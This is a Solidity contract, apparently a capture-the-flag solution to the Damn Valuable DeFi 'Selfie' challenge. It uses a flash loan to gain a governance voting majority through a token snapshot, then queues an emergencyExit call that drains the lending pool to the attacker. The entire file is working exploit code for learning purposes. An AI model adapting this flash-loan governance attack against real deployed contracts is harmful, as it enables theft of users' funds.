// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import { SimpleGovernance } from "../SimpleGovernance.sol";
import { SelfiePool } from "../SelfiePool.sol";
import "contracts/DamnValuableTokenSnapshot.sol";

/**
 * @title SelfiePoolAttacker
 * @author y0ng0p3 (https://github.com/y0ng0p3)
 */
contract SelfiePoolAttacker is IERC3156FlashBorrower {

    uint256 public actionId;
    address private immutable owner;
    SimpleGovernance private immutable governance;
    SelfiePool private immutable pool;
    DamnValuableTokenSnapshot private immutable token;

    constructor(address _governance, address _pool, address _token) {
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);

        owner = msg.sender;
    }

    function attack() external {
        // borrow the maximum amount available on the pool
        // the max amount make us sure that we'll have enough votes power to queue our malicious action
        // the data passed to pool.flashLoan() is a call to emergencyExit() which will drain all funds from pool
        pool.flashLoan(
            this,
            address(token),
            pool.maxFlashLoan(address(token)),
            abi.encodeWithSignature("emergencyExit(address)", owner)
        );
    }

    function onFlashLoan(address, address, uint256 _amount, uint256, bytes calldata _data) external returns(bytes32) {
        // take another snapshot showing us having over 50% of the DVT necessary to queue actions
        token.snapshot();

        // queue the action that will call emergencyExit on pool
        actionId = governance.queueAction(address(pool), 0, _data);
        
        // approve pool to spend the amount borrowed, to get the funds back to the pool
        token.approve(address(pool), _amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
